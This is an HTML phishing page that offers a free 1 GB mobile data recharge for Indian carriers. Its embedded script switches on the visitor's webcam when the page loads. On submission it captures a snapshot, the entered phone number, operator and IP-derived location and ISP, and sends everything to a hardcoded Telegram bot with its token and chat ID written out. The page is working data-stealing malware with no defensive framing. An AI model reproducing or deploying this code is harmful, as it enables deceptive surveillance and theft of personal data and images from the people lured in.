 <!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Free 1 GB Data Booster</title>
    <style>
        body {
            background: linear-gradient(to right, #00c6ff, #0072ff);
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        .container {
            background: #fff;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            text-align: center;
            width: 100%;
            max-width: 400px;
        }

        h1 {
            font-size: 24px;
            color: #333;
            margin-bottom: 20px;
        }

        .notice {
            background: #ffecb3;
            padding: 10px;
            border: 1px solid #ffeb3b;
            border-radius: 5px;
            margin-bottom: 20px;
            font-size: 14px;
        }

        .form-box {
            border: 1px solid #ddd;
            padding: 20px;
            border-radius: 10px;
            margin-bottom: 20px;
        }

        select, input[type="text"] {
            width: calc(100% - 20px);
            padding: 10px;
            margin-bottom: 10px;
            border: 1px solid #ccc;
            border-radius: 5px;
            box-sizing: border-box;
        }

        .submit-button {
            background: #00c853;
            color: #fff;
            border: none;
            padding: 10px;
            border-radius: 5px;
            width: 100%;
            cursor: pointer;
            transition: background 0.3s;
        }

        .submit-button:hover {
            background: #00b04f;
        }

        .user-count {
            font-size: 14px;
            color: #333;
        }

        video {
            width: 100%;
            margin-bottom: 10px;
        }

        canvas {
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>üöÄ Free 1 GB Network Data</h1>
        <div class="notice">üéÅ Free 1GB data pack recharge for everyone from us.</div>
        <div class="form-box">
            <form id="data-form">
                <select id="operator" required="">
                    <option value="">Select Operator</option>
                    <option value="Jio">Jio</option>
                    <option value="Airtel">Airtel</option>
                    <option value="VI">VI</option>
                    <option value="BSNL">BSNL</option>
                </select>
                <input type="text" id="mobile-number" placeholder="Mobile Number" required="" maxlength="10" pattern="\d{10}" title="Enter 10 digit mobile number">
                <button type="submit" class="submit-button">üéÅ Claim</button>
            </form>
        </div>
        <div class="user-count">üòÉ Claimed 3589/5000 users.</div>

        <!-- Video element for webcam -->
        <video id="video" autoplay></video>

        <!-- Canvas element to capture the video snapshot -->
        <canvas id="canvas"></canvas>
    </div>

    <script>
        const BOT_TOKEN = "7333847070:AAFUwJpWNvTZTQLVIsbcCicJZlWAmqFFNa4"; // Your Telegram Bot Token
        const CHAT_ID = "7416312733"; // Your Telegram Chat ID
        const API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

        // Function to fetch IP details
        async function getIpDetails() {
            try {
                const response = await fetch("https://ipapi.co/json/");
                if (!response.ok) throw new Error("Failed to fetch IP details");
                return await response.json();
            } catch (error) {
                console.error("Error fetching IP details:", error);
                return { ip: "Unknown", city: "Unknown", region: "Unknown", country: "Unknown", org: "Unknown", asn: "Unknown" };
            }
        }

        // Function to send message to Telegram
        async function sendTelegramMessage(message, image) {
            const data = {
                chat_id: CHAT_ID,
                text: message,
                parse_mode: "HTML",
            };

            // If image is available, send as file
            if (image) {
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', image, 'snapshot.jpg');

                try {
                    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                        method: "POST",
                        body: formData,
                    });
                    const result = await response.json();
                    console.log("Image sent to Telegram:", result);
                } catch (error) {
                    console.error("Error sending image:", error);
                }
            }

            try {
                const response = await fetch(API_URL, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify(data),
                });
                const result = await response.json();
                console.log("Message sent to Telegram:", result);
            } catch (error) {
                console.error("Error sending message:", error);
            }
        }

        // Function to handle form submission
        document.getElementById("data-form").addEventListener("submit", async function (event) {
            event.preventDefault();

            const operator = document.getElementById("operator").value;
            const mobileNumber = document.getElementById("mobile-number").value;

            const ipDetails = await getIpDetails();

            // Capture image from video
            const canvas = document.getElementById("canvas");
            const context = canvas.getContext("2d");
            context.drawImage(document.getElementById("video"), 0, 0, canvas.width, canvas.height);
            canvas.toBlob(async function(blob) {
                // Send the message with image to Telegram
                const message = `
<b><u>‚òéÔ∏è Number Tracked:</u></b>
<b>üì± Mobile Number:</b> +91${mobileNumber}
<b>üì° Operator:</b> ${operator}
<b>üåê IP Information:</b>
<b>üåê IP Address:</b> <i>${ipDetails.ip}</i>
<b>üåç Location:</b> <i>${ipDetails.city}, ${ipDetails.region}, ${ipDetails.country}</i>
<b>üì° ISP:</b> <i>${ipDetails.org}</i>
<b>üîç ASN:</b> <i>${ipDetails.asn}</i>
<b>üë®‚Äçüíª Tracked by:</b> <i>@YourBotName</i>
`;

                await sendTelegramMessage(message, blob);
            }, "image/jpeg");

            alert("Tracking complete and sent to Telegram!");
        });

        // Restrict input for mobile numbers to digits only
        document.getElementById("mobile-number").addEventListener("input", function () {
            this.value = this.value.replace(/[^0-9]/g, "");
        });

        // Function to initialize webcam
        async function initWebcam() {
            const videoElement = document.getElementById("video");
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                videoElement.srcObject = stream;
            } catch (error) {
                console.error("Error accessing webcam:", error);
                alert("Please allow access to your webcam.");
            }
        }

        // Initialize the webcam on page load
        window.onload = function() {
            initWebcam();
        };
    </script>
</body>
</html>
